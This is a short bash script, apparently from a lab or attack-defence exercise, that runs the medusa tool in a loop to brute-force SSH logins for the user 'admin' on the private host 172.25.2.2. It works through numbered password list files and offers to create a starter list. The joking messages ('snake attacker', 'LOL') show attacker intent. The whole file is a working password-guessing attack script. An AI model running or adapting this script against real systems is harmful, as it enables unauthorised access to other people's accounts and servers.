#!/bin/bash

password_list="striker"
wildcard="*"

if [ -e "$password_list"0 ];
then
	limit=($(ls $password_list$wildcard))
	for (( i=0; $i < ${#limit[@]}; i++ ))
	do
		medusa -h 172.25.2.2 -u "admin" -P "$password_list$i" -M ssh
	done
else
	echo "Error: File $password_list does not exist!"
	read -p "Would you like to create one?[Y|y|N|n] " _create
	case $_create in
		Y|y)touch $password_list'0'
		echo "admin" | tee -a $password_list'0' && echo "Adding 'admin' to the list" && echo "Done!"
		;;
		*)echo "Error: Escaping from snake attacker!"
		echo "How luck your opponent will be(LOL)!"
		;;
	esac
fi
